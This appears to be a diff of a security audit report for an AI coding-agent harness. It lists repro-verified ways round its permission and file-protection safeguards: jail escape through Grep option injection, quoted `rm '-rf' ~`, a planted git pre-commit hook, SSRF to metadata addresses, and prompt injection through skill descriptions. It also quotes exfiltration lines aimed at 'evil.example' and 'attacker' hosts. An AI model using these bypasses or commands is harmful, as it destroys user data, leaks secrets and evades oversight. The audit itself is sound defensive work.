+- **Repro:** A `.gitignore` of 20 identical lines `**a**a**a**a**a**a**a**a**a**a**a**a**a**a**c` (about 900 bytes), and 2,000 empty files named `c` + 40×`a` + N. A single `ignores()` call took 0.094 s and ended with `Backtrack limit exhausted`. **`Glob '**/*'` took 138.97 s.** Grep over the same tree took 0.03 s, because it filters only grep's hits. A cloned repository supplies both the `.gitignore` and the files, so the model's first Glob in that repo runs past the 120 s turn deadline (known #7 covers the deadline; this is a new way to reach it, and Glob, unlike Bash, is not the model's choice to make slow). PCRE's backtrack limit makes each match fail instead of hang. That keeps the cost bounded per call, but the result is a **fail-open verdict**: a rule that errors is treated as not matching, so a negation (`!keep.me`) or a hide rule quietly stops applying. Ignore rules are not a security boundary, but before the F-J2 fix the `.env` guard relied on them in practice.
 - **Fix:** Collapse runs of `*`/`**` while compiling (`**a**a` has the same meaning as a single wildcard sequence, and git's own `wildmatch` is linear). Use possessive or atomic groups (`(?>.*)` is wrong for globs, so use a hand-written glob matcher like git's), or cap the number of wildcards per line (git has an implicit cap). Treat `preg_match() === false` as **match** for hide rules (fail closed) and log the rule once. Cache verdicts per directory prefix so that N files do not re-test the same parent N times.
 - **Test:** The repro as a PHPUnit test with a time budget: Glob over 2,000 files under the hostile `.gitignore` must finish in under 2 s. Add a unit test showing that a rule which hits the backtrack limit still hides its target.
 
@@ -20548,45 +20427,12 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ### B. Path jail and file-protection bypasses
 
-#### F-J1 — Grep option injection: a pattern like `-Re…` makes grep follow symlinks out of the jail
-- **Severity:** High. **Confidence:** Verified-by-repro (`r03_grep_optinj.php`).
-- **Where:** `src/Tools/BuiltIn/Grep.php` (execute): `$cmd .= ' ' . escapeshellarg($pattern) . ' ' . escapeshellarg($path);`. There is no `--` and no `-e` before the pattern.
-- **Excerpt:**
-  ```php
-  $cmd = 'grep -rn';
-  $cmd .= $rules->grepExcludeFlags();
-  ...
-  $cmd .= ' ' . escapeshellarg($pattern) . ' ' . escapeshellarg($path);
-  ```
-- **Exploit:** `escapeshellarg` stops shell injection but not *option* injection. Pattern `-ReSECRET` is parsed by grep as `-R` (dereference **all** symlinks while recursing) plus `-e SECRET`. The repo contains `innocent_link -> ../outside` (git stores symlinks, so a cloned hostile repo can ship `docs -> /home/victim` or `x -> /`). Results:
-  - Normal `Grep pattern=SECRET` → nothing. `Read innocent_link/creds.txt` → "path outside workspace root".
-  - `Grep pattern=-ReSECRET path=.` → `…/root/innocent_link/creds.txt:1:SECRET_TOKEN=hunter2`.
-
-  Grep is classed read-only (Allow in `default`/`plan`/`dont-ask`) and is ParallelSafe, so this reads anything the user can read in every mode, including where Bash is denied. Other options are reachable the same way (`--devices=read`, `-f FILE`, and so on).
-- **Fix:** `grep -rn … -e <pattern> -- <path>` (or `--regexp=`). Add `--no-dereference-recursive` semantics explicitly (`-r` already does this, but the fix is to stop option parsing). The same review applies to any future rg path.
-- **Test:** A fixture with an out-of-root symlink, then Grep with patterns `-Re.`, `-R`, `--dereference-recursive`. Assert there are no hits outside the root. Also assert a literal pattern `-foo` *matches* the text `-foo` in a file.
-
-#### F-J2 — The `.env` / `.git/config` secret guard is bypassed by Grep and by trivial Bash spellings
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r07_env_grep.php`).
-- **Where:** `src/Hooks/BuiltIn/ProtectFilesHook.php:130` has matcher `^(Bash|Edit|Write|Read)$`, so Grep, Glob, Lsp and MCP are never checked. `:49` pattern `/(^|[\s\/])\.env(\s|$)/` requires whitespace or end-of-string after the name.
-- **Repro results (full built-in chain):** `Read .env` → deny, `Bash cat .env` → deny, **`Bash cat .env;true` → allow**, **`Bash cat ".env"` → allow**, **`Grep pattern== path=. include_ignored:true` → allow**, and its output is `…/root/.env:1:DB_PASSWORD=s3cr3t`. (`grep -r` searches dotfiles. The `.gitignore` filter only hides the hit until `include_ignored:true`.)
-- **Docs contradiction:** `PERMISSIONS.md` "The hooks that outrank the gate" says `.env` is refused for "Read, Edit, Write, Bash — reading it *is* the leak". The doc never mentions Grep, which is the easiest route, and the Bash half falls to a semicolon or quotes. `.env.local` and `.env.production` are not covered at all.
-- **Fix:** (1) Extend the matcher to `Grep|Glob|Lsp` and screen Grep *output* paths (or pass `--exclude=.env* --exclude-dir=.git` to grep). (2) Loosen the Bash regex boundary to `(?![\w.-])` as the WRITE_ONLY patterns already do, and strip quotes before matching. (3) Cover `.env.*`.
-- **Test:** A table test through `HookManager::preToolUse` with the cases above. Add a Grep integration test asserting `.env` contents never appear even with `include_ignored:true`.
-
 #### F-J3 — Path-scoped deny rules miss relative or absolute respellings and symlinks
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
 - **Where:** `src/Permissions/PermissionRule.php` `matchesPathSubject()` / `normalisePath()`. Normalisation is lexical only and never anchored to the workspace root. For a pattern starting with `/`, suffix matching is skipped.
 - **Failure:** With rule `Read(/proj/secret.txt)` deny, the call `/proj/secret.txt` → Deny, but **`secret.txt` → Allow** and **`./secret.txt` → Allow**. The tools resolve relative paths against `--root`, so all three name the same file. A symlink `notes -> secret.txt` also passes any path deny rule, because realpath is never consulted.
 - **Fix:** Before matching, resolve the subject the way the tool will, with `PathJail::resolve($root, $subject)` (the gate needs the root). Match deny rules against both the raw spelling and the resolved spelling, which mirrors what `ProtectFilesHook::pathSpellings()` already does.
 - **Test:** A deny rule with an absolute pattern, then calls with a relative, `./`, `sub/../`, and symlink spelling. All must Deny.
-
-#### F-J4 — `.git/hooks/*` is unprotected; `accept-edits` auto-runs `cp ./x ./.git/hooks/pre-commit`
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r09_accept.php`).
-- **Where:** `ProtectFilesHook::DEFAULT_PROTECTED_PATTERNS` guards `.git/config` but not `.git/hooks/`. `PermissionGate::isScopedWriteTool()` treats any contained relative path as a safe scoped write.
-- **Failure:** Under `accept-edits`, `Bash cp ./payload.sh ./.git/hooks/pre-commit` → **Allow**, with no prompt. That plants code which runs on the user's next `git commit`, *outside* any sugar-crush session or mode: persistence and privilege escalation from one injected instruction. (`.mcp.json` and `.sugar-crush/settings.json` are also auto-allowed this way, but those are already known as #9.) Under bypass and auto (F-P3), `Write .git/hooks/pre-commit` is allowed too.
-- **Fix:** Add `#(^|/)\.git/(hooks/|info/|config\b)#` (plus `.gitattributes`/`.gitmodules` filters if desired) to the WRITE_ONLY patterns. In `isScopedWriteTool`, refuse any path with a `.git` segment.
-- **Test:** Gate table test where `accept-edits` + `cp ./x ./.git/hooks/pre-commit` gives `Ask`. Add a hook test where `Write file_path=.git/hooks/pre-commit` → deny in every mode.
 
 #### F-J5 — BashEscapeDenyHook is unwired, trivially bypassed, and denies `> /dev/null`
 - **Severity:** Low (dormant). **Confidence:** Verified-by-repro (`r14_escape.php`) plus reading.
@@ -20601,37 +20447,10 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ### C. Permission gate and modes
 
-#### F-P1 — The quoted-flag `rm` bypasses both the step-0 "self-destruct" breaker and ConfirmRemoveHook
-- **Severity:** High. **Confidence:** Verified-by-repro (`r08_gate.php`, decisions only; nothing was executed).
-- **Where:** `src/Permissions/PermissionGate.php` `segmentIsRmRfRootOrHome()`: flags are recognised only when `str_starts_with($token, '-')`, and only the **first** non-flag token is checked as the target. `src/Hooks/BuiltIn/ConfirmRemoveHook.php:30-40` requires `\s-` directly before the flag.
-- **Repro, `bypass-permissions` (the shipped default) with the full built-in chain:**
-  - `rm '-rf' ~` → **allow**
-  - `rm "-rf" /` → **allow**
-  - `find . '-delete'` → **allow**
-
-  The breaker alone, in bypass mode: `rm -rf ./x /` → **Allow** (only the first target is checked), `rm -rf /*` → Allow, `rm -rf ~/` → Allow, `rm -rf $HOME` → Allow. ConfirmRemoveHook catches the unquoted forms, but the quoted-flag forms pass **both** layers. bash strips the quotes, so `rm '-rf' ~` deletes `$HOME`, because GNU `--preserve-root` protects only `/`.
-- **Docs contradiction:** `PERMISSIONS.md` §"The six modes" says step 0 means "no allow rule and no mode … can talk the gate into a self-destruct" and lists tolerance for "a quoted target". It does not handle a quoted *flag*, a second target, `/*`, `~/` or `$HOME`.
-- **Fix:** Tokenise with the quote-aware `tokenizeSingleCommand()`-style scanner that already exists in the class, which strips quotes. Check **every** operand. Normalise targets: `~`, `~/`, `$HOME`, `${HOME}`, `/`, `/*`, `/.` and `//` all resolve to root or home. Apply the same unquoting in ConfirmRemoveHook.
-- **Test:** A data provider over the strings above, each asserting `Deny` through `PermissionGate::evaluate()` *and* through the full `HookManager` chain.
-
-#### F-P2 — Plan mode's "no writes via Bash" check misses `>f`, `2> f`, `>|`, and every non-redirect write
-- **Severity:** High. **Confidence:** Verified-by-repro (`r08_gate.php`).
-- **Where:** `PermissionGate::isBashWriteCommand()`:
-  ```php
-  return (bool) preg_match('/\s+>\s+/', $cmd)
-      || (bool) preg_match('/\s+>>\s+/', $cmd)
-      || (bool) preg_match('/\|\s*tee(\s+|$)/', $cmd);
-  ```
-- **Repro (plan mode):** `echo x > f` → Deny. **Allow:** `echo x >f`, `echo x>f`, `echo x 2> f`, `cat a >| f`, `sed -i s/a/b/ src.php`, `git commit -am wip`, `git push --force`, `rm src/main.php`, `mv src /tmp/`, `curl -o f …`, `cp /dev/null README.md`, `python3 -c "open('f','w')"`, `truncate -s0 f`.
-- **Why it matters even with known #1:** In the TUI an Ask becomes a deny, but plan-mode **Bash is an Allow**, so this path is live. Plan mode is the mode a user picks to *guarantee* no changes, and a single injected `sed -i` or `git push --force` runs unprompted. `PERMISSIONS.md` claims "`echo x > f` is denied"; the space-free spelling is not.
-- **What the code admits:** `src/Permissions/PermissionMode.php` `description()` for Plan does say "any shell command that does not redirect output runs — a destructive `rm` and an outbound `curl` included, so this is not a dry run" (pinned by `tests/Permissions/PermissionModeDescriptionTest.php`). So the non-redirect half is a **documented design choice**, and the redirect half (`>f`, `2> f`, `>|`) is a **defect against that same contract**. Both halves contradict what "plan" means in Claude Code and opencode, where it is read-only. `PERMISSIONS.md:124-126` also says plan "deliberately allows exploratory `Bash`". The severity stays High because of what plan mode can do to a user who never read either sentence: one injected instruction gets unprompted `rm`, `sed -i` and `git push --force`. The redirect check is the only Bash guard plan mode has, and it misses the common spellings.
-- **Fix:** Invert the policy. In plan mode, allow Bash only when a quote-aware tokeniser finds a single command or pipeline of known read-only commands (`ls cat head tail grep rg find(without -delete/-exec) git {status,log,diff,show,blame,branch --list} wc sort …`) with **no** redirection token of any spacing (`>`, `>>`, `>|`, `&>`, `N>`), and otherwise Deny. The class already has the tokeniser.
-- **Test:** The repro list as a data provider: each must be Deny under Plan, and `git log --oneline` / `grep -rn foo src` must stay Allow.
-
 #### F-P3 — `auto` mode classifies only Bash, so Write, Edit, WebFetch and all `mcp__*` calls are always Allow; the classifier also has unescaped `|` regex bugs
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r10_auto.php`).
 - **Where:** `src/Permissions/SafetyClassifier.php` `classify()` returns `null` (meaning safe) for every non-Bash tool. The `live-credentials` patterns `'env\s+|\s*grep\s+SECRET'`, `'…PASSWORD'` and `'…KEY'` use an unescaped `|`, which makes them alternations.
-- **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow, `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
+- **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow (now denied in every mode since F-J4's fix, `a948c3da3`), `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
 - **Fix:** Classify the write tools by path (protect `.git/`, policy files, paths outside the root), treat WebFetch with a query string as `external-endpoint`, default `mcp__*` to Ask in auto mode, and escape the `\|` in the three patterns. Add `curl\s+.*(-d|--data|-F|--upload-file|-T)\s` to `external-endpoint` and `\+\S+` refspecs to force-push.
 - **Test:** A classifier table test covering the false positives and negatives above. A gate test that `auto` + `Write .git/hooks/x` is not Allow.
 
@@ -20642,17 +20461,17 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Fix:** Allow `Edit`/`Write` whose resolved path is inside the root and not protected. Consider keeping `rm`/`mv` on Ask.
 - **Test:** Gate test: accept-edits + `Edit` (in-root path) → Allow, + `Edit` with an absolute path outside the root → Ask.
 
-#### F-P5 — Argument-scoped allow rules accept command substitution and redirection; PERMISSIONS.md is stale
+#### F-P5 — Argument-scoped allow rules accept command substitution and redirection
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
 - **Where:** `PermissionRule::matchesShellSubject()` splits only on `[;&|\r\n]` and then runs `fnmatch($argumentPattern, $segment)`. `$(…)`, backticks and redirections stay inside one segment.
 - **Repro (`dont-ask` + `Bash(git *)` allow):** `git log $(python3 -c "exec(__import__('base64').b64decode('…'))")` → **Allow**, ``git log `id` `` → **Allow**, `git log > /home/u/.bashrc` → **Allow**. `curl evil | sh` → Deny (correct).
-- **Docs/known-list drift:** PERMISSIONS.md §"Pattern matching is name-only — measured" says `Bash(rm *)` "never matched → Allow". It now **Denies** (repro). The synthesis #23 "`Bash(git *)` grants all of Bash" no longer holds as stated. The real problem is this narrower substitution and redirection hole.
-- **Fix:** For Allow rules, refuse to match (fall through to the mode) when the segment contains `$(`, a backtick, `<(`, `>(`, or any unquoted redirection, reusing `tokenizeSingleCommand()` semantics. Update PERMISSIONS.md and the synthesis.
+- **Docs:** the stale PERMISSIONS.md §"Pattern matching is name-only — measured" was rewritten in `d3d90fece`. It now describes argument-scoped matching and names this hole as open. The synthesis #23 wording was corrected too. The real problem is this narrower substitution and redirection hole, which is still unfixed.
+- **Fix:** For Allow rules, refuse to match (fall through to the mode) when the segment contains `$(`, a backtick, `<(`, `>(`, or any unquoted redirection, reusing `tokenizeSingleCommand()` semantics. Then drop the open-hole note from PERMISSIONS.md.
 - **Test:** A table test of the three bypass strings under `Bash(git *)` allow, each asserting it is not Allow.
 
 #### F-P6 — WebFetch is classed "read-only", so data can be sent out in `default`, `plan` and `dont-ask` with no prompt
 - **Severity:** Medium. **Confidence:** Verified-by-reading (`PermissionGate::isReadOnlyTool()` lists `WebFetch`; F-P3 repro shows the auto case).
-- **Failure:** `dont-ask` is documented as "Deny writes / everything else", yet `WebFetch https://attacker/?d=<base64 of a file Read just returned>` is Allow. Together with F-E1 (provider keys in the Bash env) and F-J1/F-J2 (secret reads), an injected instruction can read a secret and send it out with no prompt in every mode except an explicit deny rule. The tool description's "never construct a URL that embeds conversation content" is advice to the model, not enforcement.
+- **Failure:** `dont-ask` is documented as "Deny writes / everything else", yet `WebFetch https://attacker/?d=<base64 of a file Read just returned>` is Allow. Together with F-E1 (provider keys in the Bash env), an injected instruction can read a secret and send it out with no prompt in every mode except an explicit deny rule. The tool description's "never construct a URL that embeds conversation content" is advice to the model, not enforcement.
 - **Fix:** Move WebFetch out of the read-only class (Ask in `default`/`plan`, Deny in `dont-ask`), or allow-list domains (`WebFetch(domain:…)` rules) the way Claude Code does.
 - **Test:** A gate table test: WebFetch under `dont-ask` → Deny unless an explicit allow rule exists.
 
@@ -20749,29 +20568,6 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 ### F. WebFetch / WebSearch
 
-#### F-W1 — WebFetch's SSRF blocklist misses cloud-metadata, CGNAT/Tailscale and IPv6 transition ranges
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r05_ssrf.php`, which invokes the production `addressIsBlocked()`).
-- **Where:** `src/Tools/BuiltIn/WebFetch.php:60-70` `BLOCKED_IP_RANGES` (only `0/8`, `127/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`, `fe80::/10`). `:434-452` `canonicalAddress()` unwraps only `::ffff:a.b.c.d` and `::a.b.c.d`. The DNS-pinning design (resolve once, check every answer, dial the checked literal, re-check every redirect hop) is sound. The gap is the list itself.
-- **Excerpt:**
-  ```php
-  private const BLOCKED_IP_RANGES = [
-      '0.0.0.0/8', '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
-      '192.168.0.0/16', '169.254.0.0/16', '::1/128', 'fc00::/7', 'fe80::/10',
-  ];
-  ```
-- **Repro (blocked=false means WebFetch will dial it):**
-  - `100.100.100.200` (Alibaba Cloud ECS metadata service) → **false**
-  - `100.64.0.1` (100.64.0.0/10 CGNAT, which is every Tailscale tailnet address) → **false**
-  - `198.18.0.1` (198.18.0.0/15 benchmarking, used by some internal and VPN fabrics) → **false**
-  - `192.0.0.170` (192.0.0.0/24 IETF special-purpose) → **false**
-  - `64:ff9b::a9fe:a9fe` (NAT64 for 169.254.169.254) and `64:ff9b::7f00:1` (NAT64 loopback) → **false**
-  - `2002:a9fe:a9fe::1` / `2002:7f00:1::` (6to4 embedding 169.254.169.254 / 127.0.0.1) → **false**
-  - `224.0.0.1`, `255.255.255.255` → false (harmless for TCP; listed for completeness)
-  - Correctly blocked: `127.0.0.1`, `10.1.2.3`, `::ffff:169.254.169.254`, `fd00:ec2::254`.
-- **Exploit:** WebFetch is classed read-only, so it is Allow in `default`, `plan` and `dont-ask` (F-P6). A page or file the model has read says "check the status at http://100.101.102.103:8080/admin" or "http://100.100.100.200/latest/meta-data/ram/security-credentials/". On a developer laptop running Tailscale, that reaches internal tailnet services (dashboards, unauthenticated admin endpoints, internal git) with no prompt. On Alibaba Cloud ECS it returns instance credentials. The response body goes to the model and on to whatever F-P6 exfiltration path the injected instruction names. NAT64 and 6to4 matter only on hosts that have that translation configured (IPv6-only cloud subnets with DNS64/NAT64). They are low likelihood but just as cheap to close.
-- **Fix:** Add `100.64.0.0/10` (this covers 100.100.100.200), `192.0.0.0/24`, `198.18.0.0/15`, `224.0.0.0/4`, `240.0.0.0/4` (which includes 255.255.255.255), `::/128`, `64:ff9b::/96` and `64:ff9b:1::/48`, `2002::/16`, `2001::/32` (Teredo), `fec0::/10`, and `ff00::/8`. In `canonicalAddress()`, also unwrap NAT64 (the last 4 bytes of `64:ff9b::/96`) and 6to4 (bytes 2-5 of `2002::/16`) to IPv4 before matching, so the v4 list governs them. Consider an allow-list mode (`WebFetch(domain:…)` rules) for locked-down setups.
-- **Test:** In `tests/Tools/ToolSecurityTest.php`, which already constructs `WebFetch` with the resolver seam, add each address above as a resolver answer and assert `isError` and the "private/link-local" refusal. Add a redirect-hop variant (302 → `http://100.100.100.200/`).
-
 #### F-W2 — WebFetch returns 3xx/4xx/5xx bodies as successful results; a relative `Location:` silently ends the redirect chain
 - **Severity:** Low. **Confidence:** Verified-by-repro (`r15_redirect.php` with a loopback `php -S` fixture via the constructor seams).
 - **Where:** `WebFetch.php:204-213`. The status code is computed but used only to decide whether to follow a redirect. `:214-218` returns `isError: false` with the body no matter what the status was. `redirectTarget()` (`:344-375`) handles only absolute `http(s)://` and `/`-rooted locations. Any other relative form (`next`, `../x`, `?page=2`) returns `null`, which is treated as "final".
@@ -20794,24 +20590,17 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 | ID | Sev | Conf | Title |
 |---|---|---|---|
-| F-T1 | High | Repro | A non-UTF-8 byte in any tool result kills the turn (Guzzle json_encode); fix at `settle()`, not the provider |
-| F-J1 | High | Repro | Grep option injection (`-Re…`) follows symlinks out of the jail |
-| F-P1 | High | Repro | Quoted-flag `rm '-rf' ~` bypasses step-0 breaker and ConfirmRemoveHook; breaker checks the first target only |
-| F-P2 | High | Repro | Plan mode allows `>f`, `2> f`, `sed -i`, `rm`, `git push --force`… (non-redirect half is documented) |
 | F-E2 | Med-High | Repro | Cancel or deadline SIGKILLs the PHP child only; setsid'd bash keeps running; Task sub-agents cascade |
 | F-T2 | Medium | Repro | Edit ignores `$maxBytes`; 35 MB file → 650 MB peak |
 | F-T3 | Medium | Reading | WebFetch 2 MiB raw result (32× Bash cap) |
 | F-T5 | Medium | Repro | Hostile `.gitignore` → Glob 139 s over 2,000 files (turn killed); backtrack errors fail open |
-| F-J2 | Medium | Repro | `.env` guard bypassed by Grep, `cat .env;`, `cat ".env"` |
 | F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks |
-| F-J4 | Medium | Repro | `.git/hooks/*` unprotected; accept-edits auto-allows planting pre-commit |
 | F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs |
 | F-P4 | Medium | Repro | accept-edits: Edit/Write Ask but `rm`/`mv`/`cp` Allow |
-| F-P5 | Medium | Repro | Arg-scoped allow rules accept `$(…)`, backticks, redirects; PERMISSIONS.md stale |
+| F-P5 | Medium | Repro | Arg-scoped allow rules accept `$(…)`, backticks, redirects (PERMISSIONS.md now documents the hole) |
 | F-P6 | Medium | Reading | WebFetch "read-only" → unprompted exfiltration in default/plan/dont-ask |
 | F-E1 | Medium | Repro | Bash and hooks inherit provider API keys; HOOKS.md env table wrong |
 | F-H1 | Medium | Repro | PostToolUse block is a no-op; output delivered, reason dropped |
-| F-W1 | Medium | Repro | WebFetch SSRF blocklist misses 100.64/10 (Tailscale, Alibaba metadata), 198.18/15, NAT64, 6to4 |
 | F-H2 | Low-Med | Reading | Audit log misses all denials; log-line forging; unbounded input |
 | F-H3 | Low-Med | Repro | Hook input JSON escapes `/`, so grep-style deny hooks never fire; encode failure gives `{}` |
 | F-P8 | Low-Med | Repro | Tool output starting `Permission denied:` is reported as a refusal although the command ran |
@@ -20868,6 +20657,20 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 **Repro scripts** (`/home/sites/crush-research-repos/_audit-scratch/15c/`): `r01_binary` (F-T1), `r02_orphan` (F-E2), `r03_grep_optinj` (F-J1), `r04_hook_exit` (exit-code table), `r05_ssrf` (F-W1), `r06_edit_big` (F-T2; the 35 MB `big.txt` fixture has been deleted, and the script recreates it), `r07_env_grep` (F-J2), `r08_gate` (F-P1/F-P2), `r09_accept` (F-P4/F-J4), `r10_auto` (F-P3), `r11_rules` (F-P5/F-J3), `r12_post_block` (F-H1), `r13_hook_env` (F-E1), `r14_escape` (F-J5), `r15_redirect` + `web/router.php` (F-W2; start `php -S 127.0.0.1:8765 web/router.php` first), `r16_gitignore_redos` (F-T5; it builds its own `redos/` fixture, with an optional file count argument), `r17_forged_refusal` (F-P8), `r18_hook_slash` (F-H3). Fixtures: `root/` (latin1.txt, .env, .gitignore, innocent_link→../outside, orphan_marker), `outside/creds.txt`, `fifo/`.
 
+---
+
+### Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.
+
+- **F-T1** A non-UTF-8 byte in any tool result killed the turn — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15a A6). Residual: the command backends still encode without `JSON_INVALID_UTF8_SUBSTITUTE` (15a A22).
+- **F-J1** Grep option injection (`-Re…`) followed symlinks out of the jail — fixed on master in `3673614b1`.
+- **F-J2** `.env` / `.git/config` secret guard bypassed by Grep and quoted Bash spellings — fixed on master in `36f139c50` (+ docs follow-up `3b04aefe8`).
+- **F-J4** `.git/hooks/*` unprotected; accept-edits auto-ran `cp ./x ./.git/hooks/pre-commit` — fixed on master in `a948c3da3` (+ docs follow-up `3b04aefe8`). Known limit: `git config core.hooksPath x` (and similar config keys) redirects hooks without naming `.git/hooks`; the permission mode is the boundary there.
+- **F-P1** Quoted-flag `rm '-rf' ~` bypassed the step-0 breaker and ConfirmRemoveHook — fixed on master in `a87b95aa3`.
+- **F-P2** Plan mode allowed `>f`, `2> f`, `sed -i`, `rm`, `git push --force` — fixed on master in `d3d90fece` (plan Bash is now an allow-list of read-only commands, fail closed; the same commit rewrote the stale PERMISSIONS.md matching section).
+- **F-W1** WebFetch SSRF blocklist missed 100.64/10, 198.18/15, NAT64 and 6to4 — fixed on master in `0594e0e17`.
+
 
 ---
 
@@ -20890,43 +20693,6 @@ This report is final. What was read, what was only skimmed, and how each open le
 ---
 
 ### A. Skills (loader, registry, listing, nudges)
-
-#### 15d-01 — A wrongly typed SKILL.md frontmatter value crashes sugar-crush at launch, including from an untrusted clone
-- **Severity:** High · **Confidence:** Verified by repro, end to end through `bin/sugarcrush`
-- **Where:** `src/Skills/SkillLoader.php:651-659` (`loadSkillManifest()` passes the raw YAML values through); `src/Skills/SkillRegistry.php:366-384` (`registerFromManifest()` → `new Skill(...)` with typed params); `src/Skills/SkillManager.php:97-99` (no try/catch around it); `bin/sugarcrush` (catches only `PermissionConfigException`)
-- **Code:**
-  ```php
-  // SkillLoader::loadSkillManifest()
-  'description' => $frontmatter['description'] ?? "Skill: $name",
-  'context' => $frontmatter['context'] ?? 'thread',
-  'paths' => $frontmatter['paths'] ?? [],
-  // SkillManager::loadAll()  — outside the try/catch that loadManifestsFromDirectory() has
-  foreach ($this->loader->loadAllManifests($projectRoot) as $manifest) {
-      $this->registry->registerFromManifest($manifest);   // new Skill(string $description, ..., array $paths)
-  }
-  ```
-- **Failure scenario:** A repository ships `.sugar-crush/skills/x/SKILL.md` containing any of the following:
-  - `paths: src/**/*.php` (a scalar, not a list)
-  - `description: 42`
-  - `description: 2024-01-01` (Symfony YAML parses this to an int timestamp)
-  - `context: [fork]`
-
-  Project skills have no trust gate. Running `sugarcrush` or `sugarcrush -p` in that checkout then dies:
-  ```
-  PHP Fatal error:  Uncaught TypeError: Skill::__construct(): Argument #10 ($paths) must be of type array, string given
-  #1 SkillManager.php(98) ... #2 Bootstrap.php(3762) skillRegistry() ... #4 NonInteractive.php(903)
-  exit=255
-  ```
-  (`r1.php`, `r1b.php`, and the live CLI run in `proj1/`.) The same YAML in a *foreign* tree (`.claude/skills`) goes through `Skill::fromFile()` inside `loadFromDirectory()`'s `catch (\Throwable)`, where it is silently skipped instead (see 15d-03).
-- **Related consequences of the same missing validation:**
-  - **Non-string `paths` entries.** `paths: [src/**, 2024]` registers fine, but `SkillPathNudge::forPath()` then throws `TypeError: SkillRegistry::pathMatches(): Argument #1 must be of type string, int given` (`SkillRegistry.php:397-400`, repro in `proj12/`). `Edit.php:201` writes the file *before* calling `skillNudge->forPath()` at `:243` (and `Write.php` at `:241`), so `Runtime.php:1795` turns the throw into an error result. The model is told the edit failed although it landed, retries, and gets "old_string not found".
-  - **YAML booleans as strings.** `user-invocable: no` gives `(bool) "no" === true` (`Skill.php:74`, `SkillLoader.php:655`). Symfony YAML 1.2 reads `no` as a string, so the author's "hide from picker" is ignored.
-- **Contrast:** `Rule::new()` already has typed field readers that throw `InvalidArgumentException` with the field name (`src/Context/Rule.php` `stringListField()` and the scalar/boolean readers around `:337-399`). Skills have no equivalent.
-- **Fix:**
-  1. Add the same typed readers to a single `SkillManifest::fromFrontmatter()` used by `Skill::parse()` and `loadSkillManifest()`. Coerce a scalar `paths` into a one-element list, refuse non-scalar list items, and parse booleans as YAML 1.1 (`yes`/`no`/`on`/`off`).
-  2. Wrap `registerFromManifest()` in `loadAll()` with the same `recordSkip()` path.
-  3. As a backstop, let `bin/sugarcrush` catch `\Throwable` at top level with a one-line message.
-- **Test:** `SkillManagerTest::testAMistypedProjectSkillIsSkippedNotFatal`, with a data provider over `paths: "x"`, `description: 42`, `description: 2024-01-01`, `context: [a]` and `paths: [1]`. Assert that `loadAll()` returns, the skill appears in `skipped()` with the field named, and `SkillPathNudge::forPath()` does not throw.
 
 #### 15d-02 — Skill descriptions from repo-controlled trees reach the system prompt verbatim: no PromptFence, no length cap, multi-line, in harness voice
 - **Severity:** High · **Confidence:** Verified by repro (`r5.php`)
@@ -20954,6 +20720,7 @@ This report is final. What was read, what was only skimmed, and how each open le
   2. Collapse each description to one line, run `PromptFence::escape()`, then clip it (reuse `SkillPathNudge::MAX_ENTRY_BYTES` = 300 B).
   3. Badge the source (`project`/`claude`/`opencode`) on each line.
   4. Escape in `SkillPathNudge::entry()` before clipping, as `RulePathNudge` does.
+- **Partly fixed on master in `a2d3dfcf3`.** Each skill line is now escaped with `PromptFence::escape()`, collapsed to one line and capped (1,024 B in the listing, 300 B in the nudge), and enabled skill bodies are escaped too. **Remaining:** the listing is still not fenced as its own prompt section with a provenance preamble (fix step 1; this needs a `Runtime::systemPromptSections()` edit), and lines carry no source badge (fix step 3). The text still sits in harness voice, so a one-line repo description can still address the model as the harness does.
 - **Test:** `BaseSystemPromptTest::testAForgedSkillDescriptionCannotEscapeOrForgeAFence`. Plant a project skill whose description carries every roster closer plus `<system-reminder>`, then assert the neutralised counts and that no raw newline from the description survives.
 
 #### 15d-03 — A repository's native skill silently replaces the user's own skill (and built-ins) of the same name; the "native wins" safeguard in SKILLS.md is defeated
@@ -20975,32 +20742,6 @@ This report is final. What was read, what was only skimmed, and how each open le
 ---
 
 ### B. Memory store
-
-#### 15d-04 — One malformed memory file breaks every turn; `parseEntry()` catches `\Exception` but the failures are `TypeError`s, and repo-local memory needs no trust
-- **Severity:** High · **Confidence:** Verified by repro (`r3.php`, plus a live `bin/sugarcrush -p` in `proj3/`)
-- **Where:** `src/Memory/MemoryStore.php:506-535`
-- **Code:**
-  ```php
-  $meta = Frontmatter::parse($parts[1]);
-  return MemoryEntry::new(type: $meta['type'], content: trim($parts[2]), scope: $meta['scope'],
-          tags: $meta['tags'] ?? [], id: $meta['id'])
-      ->withCreatedAt(new \DateTimeImmutable($meta['createdAt']))
-      ->withModifiedAt(new \DateTimeImmutable($meta['modifiedAt']));
-  } catch (\Exception) { return null; }
-  ```
